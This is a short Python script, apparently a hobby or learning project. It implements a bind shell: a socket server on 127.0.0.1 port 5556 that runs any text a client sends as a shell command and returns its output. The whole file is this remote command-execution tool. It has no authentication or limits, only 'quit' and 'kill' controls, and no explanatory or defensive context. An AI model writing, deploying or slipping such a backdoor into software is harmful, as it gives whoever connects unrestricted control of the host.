#server
import socket,sys,os
import subprocess
server =  socket.socket()

#set host and port
#host= socket.gethostname()
host='127.0.0.1'
port = 5556


def connect():
    try:
       server.bind((host,port))
    except:
        print("can not bind server")
        sys.exit()
    print("server is listening......")
    server.listen(1)

def run():
    client,address = server.accept()
    while True:
        command = client.recv(2024)
        command=command.decode()
        print(f'shell >{command}')
        if command == "quit":
            client.close()
            print("connect closed")
            print("server is listening......")
            server.listen(1)
            run()
        if command == "kill":
            server.close()
            sys.exit()
        cmd=subprocess.Popen(command,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
        client.send(cmd.stdout.read())
        client.send(cmd.stderr.read())
        #client.send(cmd.stdin.read())
def main():
     connect()
     run()
main()
